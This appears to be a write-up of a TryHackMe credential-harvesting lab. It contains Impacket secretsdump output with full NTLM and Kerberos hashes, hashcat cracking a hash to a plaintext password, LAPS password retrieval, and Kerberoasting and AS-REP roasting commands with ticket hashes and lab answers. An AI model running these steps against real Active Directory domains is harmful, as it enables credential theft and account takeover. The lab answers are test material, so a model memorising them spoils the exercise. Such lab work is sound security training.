krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:674be5e29ad22f72fffe629162c8373a3e45b4e0be20bd077de62117ea0a36cf
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:cbd27df7d02cc18d070b2773fc687e2c
CREDS-HARVESTIN$:des-cbc-md5:abc8582f8cd634d3
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
[*] Cleaning up... 



```

Apply the technique discussed in this task to dump the NTDS file locally and extract hashes. What is the target system bootkey value? Note: Use thm.red/thm as an Active Directory user since it has administrator privileges!
The target system bootkey value could be found during the decryption using the secretsdump.py
*0x36c8d26ec0df8b23ce63bcefa6e2d821*

```
┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc thm.red/thm@10.10.53.63
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:9ea464f05e82b101c9d9a4736d5da673:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:674be5e29ad22f72fffe629162c8373a3e45b4e0be20bd077de62117ea0a36cf
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:cbd27df7d02cc18d070b2773fc687e2c
CREDS-HARVESTIN$:des-cbc-md5:abc8582f8cd634d3
[*] Cleaning up... 



┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm thm.red/thm@10.10.53.63
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:9ea464f05e82b101c9d9a4736d5da673:::
[*] Cleaning up... 


┌──(kali㉿kali)-[~/Downloads/share]
└─$ hashcat -m 1000 -a 0 077cccc23f8ab7031726a3b70c694a49 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2551 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

077cccc23f8ab7031726a3b70c694a49:Passw0rd123              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 077cccc23f8ab7031726a3b70c694a49
Time.Started.....: Mon Sep 26 13:44:05 2022 (2 secs)
Time.Estimated...: Mon Sep 26 13:44:07 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1101.9 kH/s (0.12ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2103296/14344385 (14.66%)
Rejected.........: 0/2103296 (0.00%)
Restore.Point....: 2102272/14344385 (14.66%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Popcorn88 -> Passp0rt
Hardware.Mon.#1..: Util: 22%

Started: Mon Sep 26 13:43:27 2022
Stopped: Mon Sep 26 13:44:09 2022


```


What is the clear-text password for the bk-admin username?
*Passw0rd123 *


### Local Administrator Password Solution (LAPS) 

This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.

Group Policy Preferences (GPP)

A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).

GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.

The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN. Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

Local Administrator Password Solution (LAPS)

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.

The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ecdb1fcaee158d79297978a49d52b9dd.png)


Enumerate for LAPS

The provided VM has the LAPS enabled, so let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the admpwd.dll path.

```

Enumerating for LAPS

           
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM              .
06/06/2022  01:01 PM              ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,306,015,232 bytes free

        


```

The output confirms that we have LAPS on the machine. Let's check the available commands to use for AdmPwd cmdlets as follows,

```

Listing the available PowerShell cmdlets for LAPS

           
PS C:\Users\thm> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

        


```

Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is THMorg. You can use the -Identity *  argument to list all available OUs.

In Windows domains, Organizational Unit (OU) refers to containers that hold users, groups and computers to which similar policies should apply. In most cases, OUs will match departments in an enterprise. 

```

Finding Users with AdmPwdExtendedRights Attribute

           
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}

        


```

The output shows that the THMGroupReader group in THMorg has the right access to LAPS. Let's check the group and its members.

```

Finding Users belong to THMGroupReader Group

           
PS C:\Users\thm> net groups "THMGroupReader"
Group name     THMGroupReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.

PS C:\Users\victim> net user test-admin
User name                    test-admin
Full Name                    THM Admin Test Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

[** Removed **]
Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
                             *THMGroupReader           *Enterprise Admins
The command completed successfully.

        


```

Getting the Password

We found that the bk-admin user is a member of THMGroupReader, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using Get-AdmPwdPassword cmdlet by providing the target machine with LAPS enabled.

```

Getting LAPS Password with the Right User

           
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...

        


```

It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the LAPSToolkit PowerShell script in C:\Tool to try it out.

```
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM    <DIR>          .
06/06/2022  01:01 PM    <DIR>          ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,270,453,760 bytes free

PS C:\Users\thm> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}


PS C:\Users\thm> net groups "LAPsReader"
Group name     LAPsReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.


Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /savecred /user:THM.red\bk-admin cmd.exe
Attempting to start cmd.exe as user "THM.red\bk-admin" ...
Enter the password for THM.red\bk-admin:
Attempting to start cmd.exe as user "THM.red\bk-admin" ...

C:\Windows\system32>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    THMLAPSPassw0rd    2/11/2338 11:05:2...



```

Which group has ExtendedRightHolder and is able to read the LAPS password?
*LAPsReader*

 Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer? 
 Login as the user you found in question #2 to read the LAPS password! By now you should extract or found the password for the required user!
 *THMLAPSPassw0rd *



Which user is able to read LAPS passwords?
Enumerate for members of the group you found in the question #1.
*bk-admin*

### Other Attacks 

In the previous tasks, the assumption is that we already had initial access to a system and were trying to obtain credentials from memory or various files within the Windows operating system. In other scenarios, it is possible to perform attacks in a victim network to obtain credentials.

This task will briefly introduce some of the Windows and AD attacks that can be used to obtain the hashes. Before diving into more AD attack details, we suggest being familiar with Kerberos protocol and New Technology LAN Manager (NTLM), a suite of security protocols used to authenticate users.

Kerberoasting

Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. For more details about the attack, you can visit the THM Persisting AD room (Task 3).

Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.

```

Enumerating for SPN Accounts

           
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.53.63 THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  

        


```

	The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.

The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.

```

Requesting a TGS Ticket as SPN Account

           
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.53.63 THM.red/thm -request-user svc-user 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5

        


```

Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using -m 13100 mode as follows,

```

Cracking the TGS Ticket using Hashcat

           
user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

        


```

 Try replicating the steps against the attached VM by finding the SPN user and then performing the Kerberoasting attack. Once you have obtained the ticket, crack it and answer the question below.

AS-REP Roasting

AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/81bf1dad6425f8f06b0026f4e748f193.png)

The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a users.lst list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.

```
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```

We will be using the Impacket Get-NPUsers script this time as follows,

```

Performing an AS-REP Roasting Attack against Users List

           
root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.53.63 thm.red/ -usersfile /tmp/users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set

        


```

We specified the IP address of the domain controller with the -dc-ip argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.

Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the -format argument.

SMB Relay Attack

The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources. 

We suggest checking the THM Exploiting AD room for more information about the SMB relay attack.

LLMNR/NBNS Poisoning

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.

The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service. If you want to learn more about the attack, we suggest checking THM Breaching AD room.

The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine. 

```
┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.53.63 THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password: Passw0rd!
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 05:47:33.796826  <never>    



┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.53.63 THM.red/thm -request-user svc-thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 05:47:33.796826  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$e2f90d9d187662c98d741fda9f478691$5c793d3ee975eb20f32215d08c4069b14f920fd06c29450446e1f68fb0f4bc890c43263f92b249e6b7b391c97c63e4b9853004ff7d9453776c1f8922dbcc03e14ff435223d9359d7b9b2cd86b32f5078a05158baa3fb544b60dec619603ca292930833d6f2d0e230fcf3600058bf50fb08d929f9b546a57e73ded4ed9082a38b77e3c319873c400d1f590f2e203b013f173edc5260fdf8a4ecff6e880b9608bdfd8bb4d0f52eb4e48a8662035f4702da2acf9757710a68196642a892fab380bcb9ac189e6e2ee0b804cf182bcf74d834dcae563824afce5f51d25b5a1515c2b13a2362f95e4a1b8678fdbb9fa602c493062f27e8317dbbeefa56934cbf1efb508c0bc9779369095ae4f042ca85aa99fb653cf032b4bb6562d9086efa8161609aecbbf26ac310b6435f3989c35c95a7d2ac1c4b991ab120dd3832c6e015a819bf000e30fe6b85f13ddae26a06b9b3e56481c453779ccc841c711db7884f3d60dd7eb955a55aec1829266813e85b08cdede393f9200bdacfb8bf49e34d09cab258bee9e35eb6929737c9bf6c55dbc54ef47bbed2500c98fd36aec3e112fcfceb97f7d0e2425c1caec8bfff101ac37dfd0a82b93fb78e0c1eae149ad1f6fdff64e82d1775fa60a220fa64d2ca4565f49de878af9c1765ac12e59382536c8ed93d6b10001830e6cd031bdf48b864f6cf0adcd1df56c3068a533f104305d528c224c12acfd4458911b4c8a5378006fffc549685714c80eeb0e5c148ffdb9f3fa45d2f6f1ffb5a6cd082e8d50cf1f1852571285f6feabbeaa16655e7522451d8384010a5a404c7803839fe4e94a867a73dcbda39188e7ff1f47dca2deb58a5008a92be98d514ce986b50d74ab7fb9cfd5562bd8a73e297d26652b28693724df9a30627004fa9fa516c07a8f27dbb82416140cc7062dccce0a8d3a7df1c6a387ed8b246ac3d945809e1b3c087af8079d27fe45fc0f154c1f49efb08c0ec23d0f250b0f51f64cd8fefd8febb8bb66b9c817226252f4b912fc1e54151c57288182ba41389f5267751a6ae56c1553b590df6d075077431e5a8896d5cbdc282ef87879a474048101d3d6ec636e7091519378bc776205dfc1fc6caac51475e7432a49bec050d05126f951701216a99439bf795868e9ad6d1f47be0468af0dc996ea3867c06208ce569442dfc083a7b50ab5e3eca4